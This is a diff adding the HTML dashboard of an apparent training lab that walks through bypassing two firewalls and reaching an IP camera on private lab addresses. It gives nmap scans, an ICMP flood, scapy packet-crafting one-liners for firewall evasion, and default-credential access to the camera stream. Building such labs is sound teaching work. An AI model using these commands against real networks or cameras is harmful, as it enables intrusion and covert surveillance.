@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Lab — Attack Dashboard</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Orbitron:wght@400;700;900&display=swap"
+        rel="stylesheet">
+</head>
+
+<body>
+    <div class="dashboard">
+        <!-- LEFT: Terminal -->
+        <div class="panel terminal-panel">
+            <div class="panel-header">
+                <div class="dots"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+                </div>
+                <span class="panel-title">⚡ ATTACKER TERMINAL</span>
+            </div>
+            <iframe id="terminal-iframe" class="terminal-iframe" allowfullscreen></iframe>
+        </div>
+
+        <!-- TOP RIGHT: Network Topology -->
+        <div class="panel diagram-panel">
+            <div class="panel-header">
+                <span class="panel-title">🔗 NETWORK TOPOLOGY</span>
+                <button class="reset-btn" onclick="resetProgress()">↻ RESET</button>
+            </div>
+            <div class="network-diagram">
+                <div class="node active" id="node-attacker">
+                    <div class="node-icon">🖥️</div>
+                    <div class="node-label">ATTACKER</div>
+                    <div class="node-ip">10.51.0.x</div>
+                    <div class="node-badge active">ACTIVE</div>
+                </div>
+                <div class="connector" id="conn-fw1">
+                    <div class="conn-line"></div>
+                    <div class="conn-arrow">▶</div>
+                </div>
+                <div class="node locked" id="node-fw1">
+                    <div class="node-icon">🛡️</div>
+                    <div class="node-label">FIREWALL 1</div>
+                    <div class="node-ip">10.51.0.2</div>
+                    <div class="node-badge locked">LOCKED</div>
+                </div>
+                <div class="connector" id="conn-fw2">
+                    <div class="conn-line"></div>
+                    <div class="conn-arrow">▶</div>
+                </div>
+                <div class="node locked" id="node-fw2">
+                    <div class="node-icon">🛡️</div>
+                    <div class="node-label">FIREWALL 2</div>
+                    <div class="node-ip">10.51.0.3</div>
+                    <div class="node-badge locked">LOCKED</div>
+                </div>
+                <div class="connector" id="conn-camera">
+                    <div class="conn-line"></div>
+                    <div class="conn-arrow">▶</div>
+                </div>
+                <div class="node locked" id="node-camera">
+                    <div class="node-icon">📷</div>
+                    <div class="node-label">CAMERA</div>
+                    <div class="node-ip">10.50.0.10</div>
+                    <div class="node-badge locked">LOCKED</div>
+                </div>
+            </div>
+            <!-- Camera Video Feed (hidden by default) -->
+            <div class="camera-feed" id="camera-feed">
+                <div class="feed-header">
+                    <span class="feed-title">📹 LIVE FEED</span>
+                    <button class="feed-close" onclick="closeCameraFeed()">✕</button>
+                </div>
+                <img id="camera-stream" src="" alt="Camera Stream">
+            </div>
+        </div>
+
+        <!-- BOTTOM RIGHT: Walkthrough -->
+        <div class="panel walkthrough-panel">
+            <div class="panel-header">
+                <span class="panel-title">📋 ATTACK WALKTHROUGH</span>
+                <!-- Mode Toggle -->
+                <div class="mode-toggle">
+                    <button class="mode-btn" id="mode-adventure" onclick="setMode('adventure')">🎯 ADVENTURE</button>
+                    <button class="mode-btn active" id="mode-walkthrough" onclick="setMode('walkthrough')">📖
+                        WALKTHROUGH</button>
+                </div>
+            </div>
+            <div class="steps-box">
+                <!-- Step 1 -->
+                <div class="step">
+                    <div class="step-head" onclick="toggleStep(this)">
+                        <span class="snum">01</span><span class="stitle">Network Reconnaissance</span><span
+                            class="schev">▼</span>
+                    </div>
+                    <div class="step-body">
+                        <p class="sdesc adventure-content">🎯 <strong>Objective:</strong> Discover the two firewalls and
+                            identify open services.</p>
+                        <p class="sdesc walkthrough-content">Scan the attacker network to discover firewalls and map
+                            services.</p>
+                        <div class="walkthrough-content">
+                            <div class="cmd"><span class="clbl">Discover live
+                                    hosts:</span><code>nmap -sn 10.51.0.0/24</code></div>
+                            <div class="cmd"><span class="clbl">Scan FW1 services:</span><code>nmap -sV 10.51.0.2</code>
+                            </div>
+                            <div class="cmd"><span class="clbl">Scan FW2 services:</span><code>nmap -sV 10.51.0.3</code>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- Step 2 -->
+                <div class="step">
+                    <div class="step-head" onclick="toggleStep(this)">
+                        <span class="snum">02</span><span class="stitle">Bypass Firewall #1</span><span
+                            class="schev">▼</span>
+                    </div>
+                    <div class="step-body">
+                        <div class="vtags walkthrough-content">
+                            <span class="vtag">HTTP ports 80/8080/443 always allowed</span>
+                            <span class="vtag">No ICMP rate limiting</span>
+                            <span class="vtag">SYN threshold 500/30s</span>
+                        </div>
+                        <p class="sdesc adventure-content">🎯 <strong>Objective:</strong> Bypass FW1 by exploiting its
+                            HTTP allowlist policy. Use routing and curl to reach the camera.</p>
+                        <p class="sdesc walkthrough-content">FW1 allows all HTTP traffic without inspection. Add a route
+                            through FW1 then use curl to bypass.</p>
+                        <div class="walkthrough-content">
+                            <div class="cmd"><span class="clbl">Route through
+                                    FW1:</span><code>ip route add 10.50.0.0/24 via 10.51.0.2</code></div>
+                            <div class="cmd"><span class="clbl">HTTP Bypass — camera
+                                    status:</span><code>curl http://10.50.0.10:8080/status</code></div>
+                            <div class="cmd"><span class="clbl">ICMP Flood (no rate
+                                    limit):</span><code>ping -f -c 100 -s 1400 10.50.0.10</code></div>
+                        </div>
+                        <div class="vrow">
+                            <button class="vbtn" onclick="verify('fw1')">⚡ VERIFY BYPASS</button>
+                            <a href="#" class="mlink" onclick="markDone('fw1');return false">Mark complete ↗</a>
+                        </div>
+                    </div>
+                </div>
+                <!-- Step 3 -->
+                <div class="step">
+                    <div class="step-head" onclick="toggleStep(this)">
+                        <span class="snum">03</span><span class="stitle">Bypass Firewall #2</span><span
+                            class="schev">▼</span>
+                    </div>
+                    <div class="step-body">
+                        <div class="vtags walkthrough-content">
+                            <span class="vtag">FTP Bounce (port 20)</span>
+                            <span class="vtag">Fragment bypass</span>
+                            <span class="vtag">RST Race Condition</span>
+                            <span class="vtag">Broken TCP state machine</span>
+                        </div>
+                        <p class="sdesc adventure-content">🎯 <strong>Objective:</strong> Exploit FW2's packet-level
+                            vulnerabilities using scapy. Try FTP bounce, fragmentation, or RST race conditions.</p>
+                        <p class="sdesc walkthrough-content">FW2 has packet-level vulnerabilities. Use scapy to craft
+                            exploit packets.</p>
+                        <div class="walkthrough-content">
+                            <div class="cmd"><span class="clbl">FTP Bounce — source port
+                                    20:</span><code>python3 -c "from scapy.all import *; send(IP(dst='10.50.0.10')/TCP(sport=20,dport=8080,flags='PA')/Raw(b'GET /status HTTP/1.1\r\nHost: 10.50.0.10\r\n\r\n'))"</code>
+                            </div>
+                            <div class="cmd"><span class="clbl">Fragment
+                                    Bypass:</span><code>python3 -c "from scapy.all import *; send(IP(dst='10.50.0.10',flags='MF',frag=0)/TCP(dport=8080,flags='S')); send(IP(dst='10.50.0.10',frag=3)/Raw(b'A'*100))"</code>
+                            </div>
+                            <div class="cmd"><span class="clbl">RST Race — confuse
+                                    state:</span><code>python3 -c "from scapy.all import *; import time; ip=IP(dst='10.50.0.10'); send(ip/TCP(sport=7777,dport=8080,flags='S')); time.sleep(0.01); send(ip/TCP(sport=7777,dport=8080,flags='R')); time.sleep(0.01); send(ip/TCP(sport=7777,dport=8080,flags='S'))"</code>
+                            </div>
+                        </div>
+                        <div class="vrow">
+                            <button class="vbtn" onclick="verify('fw2')">⚡ VERIFY BYPASS</button>
+                            <a href="#" class="mlink" onclick="markDone('fw2');return false">Mark complete ↗</a>
+                        </div>
+                    </div>
+                </div>
+                <!-- Step 4 -->
+                <div class="step">
+                    <div class="step-head" onclick="toggleStep(this)">
+                        <span class="snum">04</span><span class="stitle">Access Camera</span><span
+                            class="schev">▼</span>
+                    </div>
+                    <div class="step-body">
+                        <div class="vtags walkthrough-content">
+                            <span class="vtag">Default creds: admin:admin</span>
+                            <span class="vtag">/status exposed without auth</span>
+                            <span class="vtag">/health exposed without auth</span>
+                        </div>
+                        <p class="sdesc adventure-content">🎯 <strong>Objective:</strong> Access the camera's MJPEG
+                            stream using default credentials and capture video data.</p>
+                        <p class="sdesc walkthrough-content">The camera uses default credentials. Try common
+                            username/password combos to access the MJPEG stream.</p>
+                        <div class="walkthrough-content">
+                            <div class="cmd"><span class="clbl">Unauthenticated
+                                    status:</span><code>curl http://10.50.0.10:8080/status</code></div>
+                            <div class="cmd"><span class="clbl">Access stream with default
+                                    creds:</span><code>curl -u admin:admin http://10.50.0.10:8080/stream --max-time 5 -o stream.bin</code>
+                            </div>
+                            <div class="cmd"><span class="clbl">Verify captured
+                                    data:</span><code>ls -lah stream.bin && file stream.bin</code></div>
+                        </div>
+                        <div class="vrow">
+                            <button class="vbtn" onclick="verify('camera')">⚡ VERIFY ACCESS</button>
+                            <a href="#" class="mlink" onclick="markDone('camera');return false">Mark complete ↗</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Toast -->
+    <div id="toast" class="toast"></div>
+    <script src="/app.js"></script>
+</body>
+
+</html>
